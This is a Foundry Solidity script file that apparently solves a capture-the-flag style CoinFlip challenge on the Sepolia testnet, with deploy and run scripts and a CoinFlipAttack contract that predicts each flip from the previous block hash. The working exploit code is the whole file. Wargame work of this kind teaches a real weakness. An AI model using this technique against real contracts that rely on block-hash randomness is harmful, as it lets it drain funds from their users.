// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
// import {DevOpsTools} from "lib/foundry-devops/src/DevOpsTools.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Exp is Script {
    // $ forge script script/CoinFlip.s.sol --tc CoinFlipSolution
    // $ forge script script/CoinFlipExp2.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
    function run() external {
        ICoinFlip coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);
        // address attackContractAddress = DevOpsTools.get_most_recent_deployment("CoinFlipAttack", block.chainid);
        // console2.log("most_recent_deployment attackContractAddress:", attackContractAddress);
        CoinFlipAttack attackContract = CoinFlipAttack(0xC60b2725fd0d2B08bA1068E59B7DC0384e0d770e);
        // CoinFlip coinFlipInstance = new CoinFlip();
        // address attacker = makeAddr("attacker");
        // vm.deal(attacker, 1 ether);

        // ---- Attack Starts From here ---

        // - In the contract the guess is determined using the previous hash of the block.
        // - Since all the info in the blockchain is public, the numbers are used to determine the right guess.
        // - We will deploy a contract that has a function `attack`, which calculates the right guess, then calls `flip` function.
        // - every time we run `attack` function, we will first `flip` with the right guess, so `consecutiveWins` will increase by 1
        // - Repeat calling attack till you reach 10.

        // vm.startPrank(attacker);
        vm.startBroadcast();
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        // console2.log("CoinFlipAttack address:", address(attackContract));

        // for (uint256 i = 0; i < 10; i++) {
        //     // Starts from block.number = 10
        //     // And, increasing the block.number by 1 each iteration
        //     // NOTE: this is to pass `lastHash == blockValue` check in the `CoinFlip` Contract.
        //     // In real networks, you fire a function, wait for the block confirmation, then fire it again.
        //     vm.roll(10 + i); // block.number = 10 + i
        //     attackContract.attack();
        // }
        attackContract.attack();
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        // vm.stopPrank();
        vm.stopBroadcast();
    }
}
// forge script script/CoinFlipExp2.s.sol:DeployCoinFlipAttack --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv

contract DeployCoinFlipAttack is Script {
    ICoinFlip coinFlipInstance = ICoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);

    function run() external {
        vm.startBroadcast();
        CoinFlipAttack attackContract = new CoinFlipAttack(address(coinFlipInstance));
        vm.stopBroadcast();
        console2.log("CoinFlipAttack deployed at:", address(attackContract));
    }
}

contract CoinFlipAttack {
    ICoinFlip coinFlipInstance;

    constructor(address target) {
        coinFlipInstance = ICoinFlip(target);
    }

    // We will calculate the right guess, then we will call `flip` with the right value we got
    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}
